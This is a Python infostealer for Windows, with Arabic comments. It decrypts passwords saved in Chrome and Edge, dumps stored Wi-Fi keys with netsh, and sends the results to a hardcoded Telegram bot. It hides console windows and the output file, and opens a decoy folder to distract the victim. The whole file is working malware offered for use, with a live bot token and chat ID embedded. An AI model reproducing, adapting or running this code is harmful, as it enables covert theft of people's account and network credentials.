import os
import sys
import json
import base64
import sqlite3
import shutil
import subprocess
import requests
import ctypes  # المكتبة دي اللي هتقتل صوت الـ Beep للأبد

# المكتبات الحساسة لفك التشفير
try:
    from win32 import win32crypt
    from Cryptodome.Cipher import AES
except ImportError:
    pass

# إعدادات الصمت لإخفاء أي نوافذ سوداء تظهر فجأة
si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
si.wShowWindow = 0

BOT_TOKEN = "8253181046:AAGwhrXiZU02eCt54pAGwpKuxTkJ7t4YRRI"
CHAT_ID = 6012820754


def send_file_to_telegram(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        if os.path.exists(file_path):
            with open(file_path, "rb") as file:
                # disable_notification=True عشان الإرسال يكون في صمت تام
                payload = {"chat_id": CHAT_ID, "disable_notification": True}
                files = {"document": file}
                requests.post(url, data=payload, files=files, timeout=15)
    except:
        pass


def get_encryption_key(local_state_path):
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        return win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]
    except:
        return None


def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        return ""


def get_wifi_passwords():
    results = "\n--- Wi-Fi Passwords ---\n"
    try:
        data = (
            subprocess.check_output(
                ["netsh", "wlan", "show", "profiles"], startupinfo=si
            )
            .decode("utf-8", errors="ignore")
            .split("\n")
        )
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for i in profiles:
            wifi_data = (
                subprocess.check_output(
                    ["netsh", "wlan", "show", "profile", i, "key=clear"], startupinfo=si
                )
                .decode("utf-8", errors="ignore")
                .split("\n")
            )
            password = [b.split(":")[1][1:-1] for b in wifi_data if "Key Content" in b]
            results += f"SSID: {i} | Password: {password[0] if password else 'None'}\n"
    except:
        pass
    return results


def get_browser_passwords():
    results = "\n--- Browser Passwords ---\n"
    user_data = os.environ["USERPROFILE"]
    browsers = {
        "Google Chrome": os.path.join(
            user_data, "AppData\\Local\\Google\\Chrome\\User Data"
        ),
        "Microsoft Edge": os.path.join(
            user_data, "AppData\\Local\\Microsoft\\Edge\\User Data"
        ),
    }
    for name, path in browsers.items():
        local_state = os.path.join(path, "Local State")
        key = get_encryption_key(local_state)
        if not key:
            continue
        for profile in ["Default", "Profile 1", "Profile 2"]:
            db_path = os.path.join(path, profile, "Login Data")
            if os.path.exists(db_path):
                tmp_db = f"temp_{name.replace(' ', '')}.db"
                try:
                    shutil.copyfile(db_path, tmp_db)
                    conn = sqlite3.connect(tmp_db)
                    cursor = conn.cursor()
                    cursor.execute(
                        "SELECT origin_url, username_value, password_value FROM logins"
                    )
                    for row in cursor.fetchall():
                        p = decrypt_password(row[2], key)
                        if p:
                            results += (
                                f"[{name}] URL: {row[0]} | User: {row[1]} | Pass: {p}\n"
                            )
                    conn.close()
                    os.remove(tmp_db)
                except:
                    pass
    return results


if __name__ == "__main__":
    try:
        # 1. فتح الفولدر التمويهي (بأمر صامت تماماً)
        if os.path.exists("Very  Important"):
            os.startfile("Very  Important")

        # 2. تجميع البيانات
        data = get_wifi_passwords() + get_browser_passwords()
        filename = "system_info.txt"

        # 3. إزالة الحماية عن الملف لو كان موجود (عشان ميزمرش وقت الكتابة)
        if os.path.exists(filename):
            ctypes.windll.kernel32.SetFileAttributesW(filename, 128)  # 128 = Normal

        # 4. حفظ البيانات في الملف
        with open(filename, "w", encoding="utf-8") as f:
            f.write(data)

        # 5. الإرسال الصامت لموبايلك الـ Oppo
        send_file_to_telegram(filename)

        # 6. الإخفاء الاحترافي (بدون صوت Beep نهائياً)
        ctypes.windll.kernel32.SetFileAttributesW(filename, 2)  # 2 = Hidden

    except:
        pass

    # إنهاء البرنامج فوراً
    os._exit(0)
